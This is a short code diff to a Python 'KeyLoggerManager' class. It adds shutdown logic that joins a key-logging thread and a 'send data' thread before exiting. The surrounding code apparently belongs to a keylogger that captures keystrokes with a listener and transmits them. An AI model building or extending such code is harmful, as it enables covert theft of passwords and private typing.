@@ -23,6 +23,11 @@ class KeyLoggerManager(IKeyLoggerManager):
         self.__is_logging = False
         if hasattr(self, 'listener'):
             self.listener.stop()
+        if self.__logger_thread.is_alive():
+            self.__logger_thread.join()
+        if self.__send_data_thread.is_alive():
+            self.__send_data_thread.join()
+        sys.exit(0)
 
     def __listen(self):
         with Listener(on_press=self.__key_logger.on_press) as self.listener:
